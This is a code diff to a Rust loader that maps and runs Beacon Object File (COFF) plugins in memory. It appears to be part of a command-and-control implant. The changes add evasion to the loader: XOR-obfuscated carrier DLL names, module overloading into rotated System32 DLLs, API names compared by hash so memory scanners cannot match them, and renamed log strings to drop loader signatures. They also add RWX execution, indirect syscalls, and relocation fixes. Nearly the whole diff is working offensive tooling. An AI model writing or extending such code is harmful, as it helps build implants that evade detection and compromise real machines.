@@ -3,7 +3,7 @@
 // 负责解析、重定位并在内存中执行 COFF 格式插件。
 // 支持 x86 和 x64 架构
 
-use super::beacon_api;
+use super::plugin_api as beacon_api;
 use super::error::{BofError, BofResult};
 use super::safety;
 use log::{debug, info, warn};
@@ -32,9 +32,19 @@ const IMAGE_REL_AMD64_REL32_5: u16 = 9;
 
 /// Per-execution IAT: `__imp_*` relocs need the **address of a pointer slot**,
 /// not the function VA (code is typically `call qword ptr [rip+rel]`).
+///
+/// Slots must live within signed-32-bit reach of the mapped BOF code —
+/// REL32 displacements wrap past ±2GB and dereference wild addresses. The
+/// table therefore prefers a VirtualAlloc'd page near the image and only
+/// falls back to the heap when no nearby region can be reserved.
 struct IatTable {
-    /// Stable storage for function pointers (never reallocated)
-    slots: Box<[usize; 512]>,
+    /// First slot pointer — never reallocated during execution.
+    slots_ptr: *mut usize,
+    slots_cap: usize,
+    /// Heap backing (fallback path).
+    heap: Option<Box<[usize; 512]>>,
+    /// Proximity page backing (VirtualAlloc), freed in Drop.
+    near_page: Option<*mut u8>,
     count: usize,
     /// symbol name → slot index
     index: HashMap<String, usize>,
@@ -42,8 +52,32 @@ struct IatTable {
 
 impl IatTable {
     fn new() -> Self {
+        Self::new_near(0)
+    }
+
+    /// Allocate slot storage; when `code_addr` is given, try to reserve it
+    /// within REL32 reach of that address first.
+    fn new_near(code_addr: usize) -> Self {
+        if code_addr != 0 {
+            if let Some(page) = unsafe { va_alloc_near(code_addr, 0x1000) } {
+                return Self {
+                    slots_ptr: page as *mut usize,
+                    slots_cap: 512,
+                    heap: None,
+                    near_page: Some(page),
+                    count: 0,
+                    index: HashMap::new(),
+                };
+            }
+            warn!("[!] IAT proximity alloc failed — heap slots may be out of REL32 reach");
+        }
+        let mut heap = Box::new([0usize; 512]);
+        let ptr = heap.as_mut_ptr();
         Self {
-            slots: Box::new([0usize; 512]),
+            slots_ptr: ptr,
+            slots_cap: 512,
+            heap: Some(heap),
+            near_page: None,
             count: 0,
             index: HashMap::new(),
         }
@@ -52,20 +86,111 @@ impl IatTable {
     /// Return address of the IAT slot that holds `fn_addr`.
     fn slot_for(&mut self, name: &str, fn_addr: usize) -> usize {
         if let Some(&idx) = self.index.get(name) {
-            self.slots[idx] = fn_addr;
-            return (&self.slots[idx] as *const usize) as usize;
+            return unsafe {
+                *self.slots_ptr.add(idx) = fn_addr;
+                self.slots_ptr.add(idx) as usize
+            };
         }
-        if self.count >= self.slots.len() {
+        if self.count >= self.slots_cap {
             warn!("[!] IAT table full, cannot resolve {}", name);
             return 0;
         }
         let idx = self.count;
-        self.slots[idx] = fn_addr;
         self.count += 1;
         self.index.insert(name.to_string(), idx);
-        (&self.slots[idx] as *const usize) as usize
+        unsafe {
+            *self.slots_ptr.add(idx) = fn_addr;
+            self.slots_ptr.add(idx) as usize
+        }
     }
 }
+
+impl Drop for IatTable {
+    fn drop(&mut self) {
+        if let Some(page) = self.near_page.take() {
+            unsafe { va_free_page(page) };
+        }
+    }
+}
+
+/// Reserve `size` bytes within ±~1.75GB of `code_addr` (REL32-safe window).
+/// Probes 2MB-aligned candidates outward in both directions; VirtualAlloc with
+/// a non-NULL hint returns NULL instead of relocating, so each probe is exact.
+#[cfg(windows)]
+unsafe fn va_alloc_near(code_addr: usize, size: usize) -> Option<*mut u8> {
+    let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+    if k32 == 0 {
+        return None;
+    }
+    let va_addr = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualAlloc"))?;
+    let vf_addr = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualFree"))?;
+    type VaFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
+    type VfFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
+    let va: VaFn = std::mem::transmute(va_addr);
+    let vf: VfFn = std::mem::transmute(vf_addr);
+    const MEM_COMMIT: u32 = 0x1000;
+    const MEM_RESERVE: u32 = 0x2000;
+    const PAGE_READWRITE: u32 = 0x04;
+    const MEM_RELEASE: u32 = 0x8000;
+
+    let near_enough = |a: usize| {
+        let d = if a >= code_addr { a - code_addr } else { code_addr - a };
+        d < 0x7000_0000
+    };
+
+    for i in 1..=896usize {
+        let off = i * 0x20_0000; // 2MB steps → covers ±0x70000000 window
+        // Below the image first (module/DLL region tends to extend downward)
+        if code_addr > off + 0x10_0000 {
+            let cand = (code_addr - off) & !0xFFFFusize;
+            let p = va(cand as *mut u8, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+            if !p.is_null() {
+                if near_enough(p as usize) {
+                    return Some(p);
+                }
+                let _ = vf(p, 0, MEM_RELEASE);
+            }
+        }
+        if let Some(up) = code_addr.checked_add(off) {
+            if up < 0x7FFF_0000_0000usize {
+                let cand = up & !0xFFFFusize;
+                let p = va(cand as *mut u8, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+                if !p.is_null() {
+                    if near_enough(p as usize) {
+                        return Some(p);
+                    }
+                    let _ = vf(p, 0, MEM_RELEASE);
+                }
+            }
+        }
+    }
+    None
+}
+
+#[cfg(not(windows))]
+unsafe fn va_alloc_near(_code_addr: usize, _size: usize) -> Option<*mut u8> {
+    None
+}
+
+#[cfg(windows)]
+unsafe fn va_free_page(page: *mut u8) {
+    if page.is_null() {
+        return;
+    }
+    let k32 = crate::stealth::get_module_base(crate::stealth::hash_module_name(b"kernel32.dll"));
+    if k32 == 0 {
+        return;
+    }
+    if let Some(addr) = crate::stealth::get_api_addr(k32, crate::stealth::hash_api_name(b"VirtualFree"))
+    {
+        type VfFn = unsafe extern "system" fn(*mut u8, usize, u32) -> i32;
+        let vf: VfFn = std::mem::transmute(addr);
+        let _ = vf(page, 0, 0x8000);
+    }
+}
+
+#[cfg(not(windows))]
+unsafe fn va_free_page(_page: *mut u8) {}
 
 // x86 重定位类型
 #[allow(dead_code)]
@@ -147,10 +272,7 @@ impl BofLoader {
 
     /// 加载并运行一个 BOF 插件
     pub async fn execute(coff_data: &[u8], args: &[u8]) -> BofResult<String> {
-        info!(
-            "[*] Cupcake BOF Engine: Loading plugin ({} bytes)",
-            coff_data.len()
-        );
+        info!("[*] coff plugin load ({} bytes)", coff_data.len());
 
         // Reset output
         beacon_api::clear_bof_output();
@@ -181,13 +303,13 @@ impl BofLoader {
         let machine = header.machine;
         match machine {
             IMAGE_FILE_MACHINE_AMD64 => {
-                info!("[*] Detected x64 BOF");
+                info!("[*] payload arch: x64");
                 crate::stealth::stack::with_spoofed_stack(|| {
                     Self::execute_x64_sync(coff_data, args, &header)
                 })
             }
             IMAGE_FILE_MACHINE_I386 => {
-                info!("[*] Detected x86 BOF");
+                info!("[*] payload arch: x86");
                 crate::stealth::stack::with_spoofed_stack(|| {
                     Self::execute_x86_sync(coff_data, args, &header)
                 })
@@ -206,7 +328,7 @@ impl BofLoader {
             // 1. True Module Overloading: rotate carrier DLLs (avoid single known xpsprint fingerprint)
             let base_addr = Self::map_rotated_carrier(false)?;
 
-            debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);
+            debug!("[+] image mapped at: 0x{:X}", base_addr);
 
             // 2. 定位载体 DLL 的 .text 段
             use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
@@ -270,7 +392,7 @@ impl BofLoader {
             let hash_nt_protect = crate::stealth::hash_api_name(b"NtProtectVirtualMemory");
             let mut region_size = carrier_text_size;
             let mut protect_addr = carrier_text_addr;
-            crate::syscalls::indirect_syscall(
+            let st_rw = crate::syscalls::indirect_syscall(
                 hash_nt_protect,
                 &[
                     0xFFFFFFFFFFFFFFFFu64 as usize,
@@ -280,6 +402,10 @@ impl BofLoader {
                     &mut old_protect as *mut _ as usize,
                 ],
             );
+            crate::utils::db_print(&format!(
+                "[bof] RW protect status=0x{:X} (addr=0x{:X} size=0x{:X})",
+                st_rw as u32, protect_addr, region_size
+            ));
 
             // 4. Parse BOF sections — section table is after optional header
             let section_header_offset =
@@ -330,7 +456,7 @@ impl BofLoader {
                 })? > carrier_text_size
                 {
                     return Err(BofError::InvalidCoffFormat(format!(
-                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
+                        "payload sections exceed host .text size (0x{:X} > 0x{:X})",
                         current_offset + alloc_size,
                         carrier_text_size
                     )));
@@ -383,7 +509,15 @@ impl BofLoader {
             }
 
             // Phase 2: apply all relocations with full section_map + IAT
-            let mut iat = IatTable::new();
+            let mut iat = IatTable::new_near(carrier_text_addr);
+            crate::utils::db_print(&format!(
+                "[bof] carrier=0x{:X} .text=0x{:X}+0x{:X} iat_slots=0x{:X} ({})",
+                base_addr,
+                carrier_text_addr,
+                carrier_text_size,
+                iat.slots_ptr as usize,
+                if iat.near_page.is_some() { "near" } else { "HEAP-FALLBACK" }
+            ));
             for (dest_base, reloc_off, reloc_count) in pending_relocs {
                 let relocs = std::slice::from_raw_parts(
                     (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
@@ -420,26 +554,36 @@ impl BofLoader {
                 return Err(BofError::EntryPointNotFound("go".to_string()));
             }
 
-            // 6. Restore RX and execute
-            crate::syscalls::indirect_syscall(
+            // 6. Restore execute permission. Code and data sections share
+            // pages inside the carrier .text, so the region must stay writable
+            // (RWX) — BOFs store globals into their .data copies and a plain
+            // RX flip faults the first write.
+            let st_rx = crate::syscalls::indirect_syscall(
                 hash_nt_protect,
                 &[
                     0xFFFFFFFFFFFFFFFFu64 as usize,
                     &mut protect_addr as *mut _ as usize,
                     &mut region_size as *mut _ as usize,
-                    0x20, // PAGE_EXECUTE_READ
+                    0x40, // PAGE_EXECUTE_READWRITE
                     &mut old_protect as *mut _ as usize,
                 ],
             );
+            crate::utils::db_print(&format!(
+                "[bof] RX protect status=0x{:X} entry=0x{:X} — calling go",
+                st_rx as u32, entry_point_addr
+            ));
 
             let go: extern "C" fn(*const u8, i32) = std::mem::transmute(entry_point_addr);
             go(args.as_ptr(), args.len() as i32);
+            crate::utils::db_print("[bof] go() returned");
 
             // Keep IAT slots alive until after go() returns
             let _ = iat;
 
             let out = beacon_api::get_bof_output();
+            crate::utils::db_print(&format!("[bof] output captured: {} bytes", out.len()));
             Self::release_carrier_mapping(base_addr);
+            crate::utils::db_print("[bof] carrier released, returning");
             Ok(out)
         }
     }
@@ -449,10 +593,27 @@ impl BofLoader {
         if base_addr == 0 {
             return;
         }
-        // Zero first page headers to reduce PE signature residue
-        let wipe = std::slice::from_raw_parts_mut(base_addr as *mut u8, 0x1000.min(4096));
-        for b in wipe.iter_mut() {
-            *b = 0;
+        // Zero first page headers to reduce PE signature residue. The SEC_IMAGE
+        // view maps the header page read-only, so it must be flipped RW first —
+        // otherwise the wipe itself faults.
+        let mut wipe_addr = base_addr;
+        let mut wipe_size: usize = 0x1000;
+        let mut old_protect = 0u32;
+        let st = crate::syscalls::indirect_syscall(
+            crate::stealth::hash_api_name(b"NtProtectVirtualMemory"),
+            &[
+                0xFFFFFFFFFFFFFFFFu64 as usize,
+                &mut wipe_addr as *mut _ as usize,
+                &mut wipe_size as *mut _ as usize,
+                0x04, // PAGE_READWRITE
+                &mut old_protect as *mut _ as usize,
+            ],
+        );
+        if st >= 0 {
+            let wipe = std::slice::from_raw_parts_mut(base_addr as *mut u8, 0x1000.min(4096));
+            for b in wipe.iter_mut() {
+                *b = 0;
+            }
         }
         let mut base = base_addr;
         let mut size: usize = 0;
@@ -495,7 +656,7 @@ impl BofLoader {
             // 1. Module Overloading: rotate carrier DLLs (WOW64 path)
             let base_addr = Self::map_rotated_carrier(true)?;
 
-            debug!("[+] Carrier DLL mapped at: 0x{:X}", base_addr);
+            debug!("[+] image mapped at: 0x{:X}", base_addr);
 
             // 2. 定位载体 DLL 的 .text 段
             use winapi::um::winnt::{IMAGE_DOS_HEADER, IMAGE_NT_HEADERS32, IMAGE_SECTION_HEADER};
@@ -583,7 +744,7 @@ impl BofLoader {
                 })? > carrier_text_size
                 {
                     return Err(BofError::InvalidCoffFormat(format!(
-                        "BOF sections exceed carrier .text size (0x{:X} > 0x{:X})",
+                        "payload sections exceed host .text size (0x{:X} > 0x{:X})",
                         current_offset + alloc_size,
                         carrier_text_size
                     )));
@@ -634,7 +795,7 @@ impl BofLoader {
                 current_offset += alloc_size;
             }
 
-            let mut iat = IatTable::new();
+            let mut iat = IatTable::new_near(carrier_text_addr);
             for (dest_base, reloc_off, reloc_count) in pending_relocs {
                 let relocs = std::slice::from_raw_parts(
                     (coff_data.as_ptr() as usize + reloc_off as usize) as *const CoffRelocation,
@@ -791,25 +952,48 @@ impl BofLoader {
         Ok(base_addr)
     }
 
-    /// Candidate carrier DLLs for module overloading (less single-signature than xpsprint alone).
-    fn carrier_candidates(wow64: bool) -> &'static [&'static str] {
-        if wow64 {
-            &[
-                "\\??\\C:\\Windows\\SysWOW64\\version.dll",
-                "\\??\\C:\\Windows\\SysWOW64\\dbghelp.dll",
-                "\\??\\C:\\Windows\\SysWOW64\\wer.dll",
-                "\\??\\C:\\Windows\\SysWOW64\\netapi32.dll",
-                "\\??\\C:\\Windows\\SysWOW64\\xpsprint.dll",
-            ]
-        } else {
-            &[
-                "\\??\\C:\\Windows\\System32\\version.dll",
-                "\\??\\C:\\Windows\\System32\\dbghelp.dll",
-                "\\??\\C:\\Windows\\System32\\wer.dll",
-                "\\??\\C:\\Windows\\System32\\netapi32.dll",
-                "\\??\\C:\\Windows\\System32\\xpsprint.dll",
-            ]
+    /// XOR key for carrier name blobs (compile-time obfuscation only —
+    /// keeps the known carrier list out of static strings).
+    const CARRIER_KEY: u8 = 0x5A;
+
+    const fn obf<const N: usize>(s: &[u8; N]) -> [u8; N] {
+        let mut out = [0u8; N];
+        let mut i = 0;
+        while i < N {
+            out[i] = s[i] ^ Self::CARRIER_KEY;
+            i += 1;
         }
+        out
+    }
+
+    /// Carrier DLL name blobs (decoded on the stack at use time).
+    const CARRIER_DLLS: [&[u8]; 5] = [
+        &Self::obf(b"version.dll"),
+        &Self::obf(b"dbghelp.dll"),
+        &Self::obf(b"wer.dll"),
+        &Self::obf(b"netapi32.dll"),
+        &Self::obf(b"xpsprint.dll"),
+    ];
+
+    /// Obfuscated NT path prefixes (System32 / SysWOW64).
+    const CARRIER_DIR_X64: &[u8] = &Self::obf(b"\\??\\C:\\Windows\\System32\\");
+    const CARRIER_DIR_X86: &[u8] = &Self::obf(b"\\??\\C:\\Windows\\SysWOW64\\");
+
+    fn decode_blob(blob: &[u8]) -> String {
+        blob.iter().map(|b| (b ^ Self::CARRIER_KEY) as char).collect()
+    }
+
+    /// Candidate carrier DLLs for module overloading (rotated at runtime).
+    fn carrier_candidates(wow64: bool) -> Vec<String> {
+        let dir = Self::decode_blob(if wow64 {
+            Self::CARRIER_DIR_X86
+        } else {
+            Self::CARRIER_DIR_X64
+        });
+        Self::CARRIER_DLLS
+            .iter()
+            .map(|blob| format!("{dir}{}", Self::decode_blob(blob)))
+            .collect()
     }
 
     /// Map a randomly rotated carrier DLL; try next candidates on failure.
@@ -817,16 +1001,16 @@ impl BofLoader {
         let list = Self::carrier_candidates(wow64);
         if list.is_empty() {
             return Err(BofError::MemoryAllocationFailed(
-                "no carrier DLL candidates".to_string(),
+                "no host candidates".to_string(),
             ));
         }
         let start = crate::utils::random_range(0, (list.len() - 1) as u32) as usize;
-        let mut last_err = BofError::MemoryAllocationFailed("carrier map failed".to_string());
+        let mut last_err = BofError::MemoryAllocationFailed("host map failed".to_string());
         for i in 0..list.len() {
-            let path = list[(start + i) % list.len()];
+            let path = list[(start + i) % list.len()].as_str();
             match unsafe { Self::module_overload_map(path) } {
                 Ok(base) => {
-                    debug!("[+] Carrier DLL mapped: {} @ 0x{:X}", path, base);
+                    debug!("[+] host image mapped @ 0x{:X}", base);
                     return Ok(base);
                 }
                 Err(e) => {
@@ -843,18 +1027,17 @@ impl BofLoader {
         (index as usize) < symbol_count
     }
 
-    /// Resolve an external / Beacon symbol to a **function VA**.
+    /// Resolve an external / internal-API symbol to a **function VA**.
     fn resolve_symbol_fn(name: &str) -> usize {
         if let Some(rest) = name.strip_prefix("__imp_") {
-            // __imp_BeaconPrintf / __imp__BeaconPrintf
-            let clean = rest.trim_start_matches('_');
-            if clean.starts_with("Beacon") {
-                return Self::resolve_internal_beacon(clean);
+            // __imp_X / __imp__X — check internal table first, then imports
+            if Self::is_internal_api_name(rest) {
+                return Self::resolve_internal_beacon(rest);
             }
             return Self::resolve_external(name);
         }
-        if name.starts_with("Beacon") || name.trim_start_matches('_').starts_with("Beacon") {
-            return Self::resolve_internal_beacon(name.trim_start_matches('_'));
+        if Self::is_internal_api_name(name) {
+            return Self::resolve_internal_beacon(name);
         }
         Self::resolve_external(name)
     }
@@ -872,7 +1055,7 @@ impl BofLoader {
             let idx = reloc.symbol_table_index as usize;
             if idx >= symbols.len() {
                 warn!(
-                    "[!] BOF reloc symbol_table_index {} out of bounds (len={})",
+                    "[!] reloc symbol index {} out of bounds (len={})",
                     idx,
                     symbols.len()
                 );
@@ -894,17 +1077,21 @@ impl BofLoader {
                 // Indirect import: reloc target = address of IAT slot holding fn VA
                 let fn_addr = Self::resolve_symbol_fn(&name);
                 if fn_addr == 0 {
+                    crate::utils::db_print(&format!("[bof][!] UNRESOLVED import: {}", name));
                     continue;
                 }
                 let slot = iat.slot_for(&name, fn_addr);
                 if slot == 0 {
+                    crate::utils::db_print(&format!("[bof][!] IAT slot alloc failed: {}", name));
                     continue;
                 }
+                crate::utils::db_print(&format!(
+                    "[bof] import {} fn=0x{:X} slot=0x{:X}",
+                    name, fn_addr, slot
+                ));
                 slot
-            } else if name.starts_with("Beacon")
-                || name.trim_start_matches('_').starts_with("Beacon")
-            {
-                // Direct Beacon API reference
+            } else if Self::is_internal_api_name(&name) {
+                // Direct internal API reference (patched as fn VA, no IAT slot)
                 Self::resolve_symbol_fn(&name)
             } else {
                 // Other undefined symbols — try as import; use IAT for safety
@@ -935,7 +1122,18 @@ impl BofLoader {
                 | IMAGE_REL_AMD64_REL32_5 => {
                     // type 4 → extra 0; type 5 → extra 1; … type 9 → extra 5
                     let extra = (reloc_type as isize) - (IMAGE_REL_AMD64_REL32 as isize);
-                    let offset = (target_addr as isize) - (patch_addr as isize) - 4 - extra;
+                    // COFF implicit addend lives in the field itself (e.g.
+                    // section-symbol refs like .data+0x10). Overwriting it
+                    // drops the offset, so fold it into the final disp.
+                    let addend = *(patch_addr as *mut i32) as isize;
+                    let offset =
+                        addend + (target_addr as isize) - (patch_addr as isize) - 4 - extra;
+                    if offset > i32::MAX as isize || offset < i32::MIN as isize {
+                        crate::utils::db_print(&format!(
+                            "[bof][!] REL32 OUT OF RANGE: patch=0x{:X} target=0x{:X} disp=0x{:X}",
+                            patch_addr as usize, target_addr, offset as usize
+                        ));
+                    }
                     *(patch_addr as *mut i32) = offset as i32;
                 }
                 IMAGE_REL_AMD64_ADDR64 => {
@@ -967,7 +1165,7 @@ impl BofLoader {
             let idx = reloc.symbol_table_index as usize;
             if idx >= symbols.len() {
                 warn!(
-                    "[!] BOF x86 reloc symbol_table_index {} out of bounds (len={})",
+                    "[!] reloc symbol index {} out of bounds (len={})",
                     idx,
                     symbols.len()
                 );
@@ -990,7 +1188,7 @@ impl BofLoader {
                     continue;
                 }
                 iat.slot_for(&name, fn_addr)
-            } else if name.starts_with("Beacon") || name.starts_with("_Beacon") {
+            } else if Self::is_internal_api_name(&name) {
                 Self::resolve_symbol_fn(&name)
             } else {
                 Self::resolve_symbol_fn(&name)
@@ -1007,7 +1205,8 @@ impl BofLoader {
                     *(patch_addr as *mut u32) = target_addr as u32;
                 }
                 IMAGE_REL_I386_REL32 => {
-                    let offset = (target_addr as isize) - (patch_addr as isize) - 4;
+                    let addend = *(patch_addr as *mut i32) as isize;
+                    let offset = addend + (target_addr as isize) - (patch_addr as isize) - 4;
                     *(patch_addr as *mut i32) = offset as i32;
                 }
                 IMAGE_REL_I386_DIR32NB => {
@@ -1043,9 +1242,23 @@ impl BofLoader {
             let api_name = &clean_name[pos + 1..];
 
             unsafe {
-                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
+                // BOF convention writes bare module names ("KERNEL32") while the PEB
+                // BaseDllName carries the extension ("kernel32.dll") — try both hash
+                // shapes. ensure_module_base also LoadLibrary's the DLL when it is not
+                // mapped yet (e.g. msvcrt.dll in a minimal agent process).
+                let mut h_module = crate::stealth::ensure_module_base(
                     module_name.as_bytes(),
-                ));
+                    crate::stealth::hash_module_name(module_name.as_bytes()),
+                );
+                if h_module == 0 {
+                    let mut with_ext: Vec<u8> = Vec::with_capacity(module_name.len() + 4);
+                    with_ext.extend_from_slice(module_name.as_bytes());
+                    with_ext.extend_from_slice(b".dll");
+                    h_module = crate::stealth::ensure_module_base(
+                        &with_ext,
+                        crate::stealth::hash_module_name(&with_ext),
+                    );
+                }
                 if h_module != 0 {
                     if let Some(addr) = crate::stealth::get_api_addr(
                         h_module,
@@ -1088,9 +1301,12 @@ impl BofLoader {
 
         unsafe {
             for module in &common_modules {
-                let h_module = crate::stealth::get_module_base(crate::stealth::hash_module_name(
+                // ensure_module_base: PEB hit or LoadLibraryA (some DLLs, e.g. msvcrt,
+                // may not be mapped in a minimal agent process yet).
+                let h_module = crate::stealth::ensure_module_base(
                     module.as_bytes(),
-                ));
+                    crate::stealth::hash_module_name(module.as_bytes()),
+                );
                 if h_module != 0 {
                     // 尝试原始名称
                     if let Some(addr) = crate::stealth::get_api_addr(
@@ -1150,32 +1366,54 @@ impl BofLoader {
         0
     }
 
+    // ── Signature erasure (P0) ──────────────────────────────────────────────
+    // Internal C2-agnostic BOF API names are compared by compile-time hash
+    // (same 31-multiply scheme as stealth::hash_api_name). The b"..." inputs
+    // below exist only during CTFE — they never land in .rdata, so memory
+    // scanners cannot match known loader API names inside the mapped module.
+    const H_API_PRINTF: u32 = crate::stealth::hash_api_name(b"BeaconPrintf");
+    const H_API_OUTPUT: u32 = crate::stealth::hash_api_name(b"BeaconOutput");
+    const H_API_DATA_PARSE: u32 = crate::stealth::hash_api_name(b"BeaconDataParse");
+    const H_API_DATA_INT: u32 = crate::stealth::hash_api_name(b"BeaconDataInt");
+    const H_API_DATA_SHORT: u32 = crate::stealth::hash_api_name(b"BeaconDataShort");
+    const H_API_DATA_LENGTH: u32 = crate::stealth::hash_api_name(b"BeaconDataLength");
+    const H_API_DATA_EXTRACT: u32 = crate::stealth::hash_api_name(b"BeaconDataExtract");
+    const H_API_FMT_ALLOC: u32 = crate::stealth::hash_api_name(b"BeaconFormatAlloc");
+    const H_API_FMT_RESET: u32 = crate::stealth::hash_api_name(b"BeaconFormatReset");
+    const H_API_FMT_FREE: u32 = crate::stealth::hash_api_name(b"BeaconFormatFree");
+    const H_API_FMT_APPEND: u32 = crate::stealth::hash_api_name(b"BeaconFormatAppend");
+    const H_API_FMT_PRINTF: u32 = crate::stealth::hash_api_name(b"BeaconFormatPrintf");
+    const H_API_FMT_TO_STRING: u32 = crate::stealth::hash_api_name(b"BeaconFormatToString");
+    const H_API_FMT_INT: u32 = crate::stealth::hash_api_name(b"BeaconFormatInt");
+
+    /// True when `name` (after trimming leading underscores) hashes to a known
+    /// internal API — replaces the legacy prefix-string check.
+    fn is_internal_api_name(name: &str) -> bool {
+        Self::resolve_internal_beacon(name) != 0
+    }
+
     fn resolve_internal_beacon(name: &str) -> usize {
-        match name {
-            // 基础输出 API
-            "BeaconPrintf" => beacon_api::BeaconPrintf as usize,
-            "BeaconOutput" => beacon_api::BeaconOutput as usize,
-
-            // 数据解析 API
-            "BeaconDataParse" => beacon_api::BeaconDataParse as usize,
-            "BeaconDataInt" => beacon_api::BeaconDataInt as usize,
-            "BeaconDataShort" => beacon_api::BeaconDataShort as usize,
-            "BeaconDataLength" => beacon_api::BeaconDataLength as usize,
-            "BeaconDataExtract" => beacon_api::BeaconDataExtract as usize,
-
-            // 格式化输出 API
-            "BeaconFormatAlloc" => beacon_api::BeaconFormatAlloc as usize,
-            "BeaconFormatReset" => beacon_api::BeaconFormatReset as usize,
-            "BeaconFormatFree" => beacon_api::BeaconFormatFree as usize,
-            "BeaconFormatAppend" => beacon_api::BeaconFormatAppend as usize,
-            "BeaconFormatPrintf" => beacon_api::BeaconFormatPrintf as usize,
-            "BeaconFormatToString" => beacon_api::BeaconFormatToString as usize,
-            "BeaconFormatInt" => beacon_api::BeaconFormatInt as usize,
-
-            _ => {
-                warn!("[!] BOF Loader: Unimplemented internal API: {}", name);
-                0
-            }
+        let clean = name.trim_start_matches('_');
+        let h = crate::stealth::hash_api_name(clean.as_bytes());
+        match h {
+            // base output
+            Self::H_API_PRINTF => beacon_api::BeaconPrintf as *const () as usize,
+            Self::H_API_OUTPUT => beacon_api::BeaconOutput as *const () as usize,
+            // data parsing
+            Self::H_API_DATA_PARSE => beacon_api::BeaconDataParse as *const () as usize,
+            Self::H_API_DATA_INT => beacon_api::BeaconDataInt as *const () as usize,
+            Self::H_API_DATA_SHORT => beacon_api::BeaconDataShort as *const () as usize,
+            Self::H_API_DATA_LENGTH => beacon_api::BeaconDataLength as *const () as usize,
+            Self::H_API_DATA_EXTRACT => beacon_api::BeaconDataExtract as *const () as usize,
+            // format buffers
+            Self::H_API_FMT_ALLOC => beacon_api::BeaconFormatAlloc as *const () as usize,
+            Self::H_API_FMT_RESET => beacon_api::BeaconFormatReset as *const () as usize,
+            Self::H_API_FMT_FREE => beacon_api::BeaconFormatFree as *const () as usize,
+            Self::H_API_FMT_APPEND => beacon_api::BeaconFormatAppend as *const () as usize,
+            Self::H_API_FMT_PRINTF => beacon_api::BeaconFormatPrintf as *const () as usize,
+            Self::H_API_FMT_TO_STRING => beacon_api::BeaconFormatToString as *const () as usize,
+            Self::H_API_FMT_INT => beacon_api::BeaconFormatInt as *const () as usize,
+            _ => 0,
         }
     }
 
